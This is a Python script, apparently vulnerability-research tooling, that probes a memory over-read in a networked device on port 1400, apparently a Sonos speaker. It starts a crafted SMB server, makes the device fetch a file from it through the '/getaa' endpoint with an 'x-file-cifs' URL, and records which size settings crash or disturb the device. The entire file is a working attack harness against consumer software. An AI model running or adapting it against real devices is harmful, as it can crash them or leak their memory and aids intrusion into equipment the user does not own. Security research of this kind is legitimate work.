#!/usr/bin/env python3
"""Sweep the FileAllInformation over-read: usage getaa_oob.py IP [UNITS:DELTA ...]"""
import os, sys, json, time, socket, subprocess

TGT = sys.argv[1]
HERE = os.path.dirname(os.path.abspath(__file__))
PY = os.environ.get('SMB_PY', '/private/tmp/fsonos-venv/bin/python')
BASE = 2900
OUT = os.path.join(HERE, 'oob-saves')
os.makedirs(OUT, exist_ok=True)
s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM); s.connect((TGT, 1400)); SELF = s.getsockname()[0]; s.close()


def curl(url, timeout=8, out='/dev/null'):
    p = subprocess.run(['curl', '-s', '-m', str(timeout), '-o', out, '-w', '%{http_code}:%{size_download}:%{time_total}'] + [url],
                       capture_output=True, text=True)
    return p.stdout.strip() if p.returncode == 0 else 'curlrc%d' % p.returncode


def alive():
    return curl(f'http://{TGT}:1400/status/zp', timeout=3).split(':')[0]


def wait_alive(tries=12):
    for _ in range(tries):
        a = alive()
        if a == '200':
            return a
        time.sleep(0.5)
    return a


def trig(port):
    return curl(f'http://{TGT}:1400/getaa?u=x-file-cifs%3A%2F%2F{SELF}%3A{port}%2FS%2Ffolder.jpg&w=200&h=200')


def run(case, port):
    units, delta = case.split(':')
    pre = wait_alive()
    srv = subprocess.Popen([PY, os.path.join(HERE, 'smbserv_qinfo2.py'), str(port), units, delta],
                           stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
    t = time.time() + 8
    while time.time() < t:
        line = srv.stdout.readline()
        if not line or line.startswith('serving'):
            break
    time.sleep(0.4)
    trig(port); time.sleep(0.5)
    r = trig(port)
    for _ in range(3):
        if not r.startswith('curlrc'):
            break
        time.sleep(0.6); r = trig(port)
    time.sleep(0.2)
    try:
        srv.terminate(); out = srv.stdout.read() or ''
    except Exception:
        out = ''
    try:
        srv.wait(timeout=3)
    except Exception:
        srv.kill()
    post = wait_alive(6); time.sleep(1.2); late = wait_alive(6)
    rec = {'case': case, 'getaa': r, 'pre': pre, 'post': post, 'late': late,
           'q': [l for l in out.splitlines() if l.startswith('QINFO')][:1]}
    bad = pre != '200' or post != '200' or late != '200' or not r.startswith('200')
    rec['verdict'] = 'ANOMALY' if bad else 'ok'
    if bad:
        open(os.path.join(OUT, 'oob_%s_%s.json' % (units, delta)), 'w').write(json.dumps(rec, indent=1))
    print(json.dumps(rec), flush=True)


if __name__ == '__main__':
    for i, c in enumerate(sys.argv[2:]):
        run(c, BASE + i)
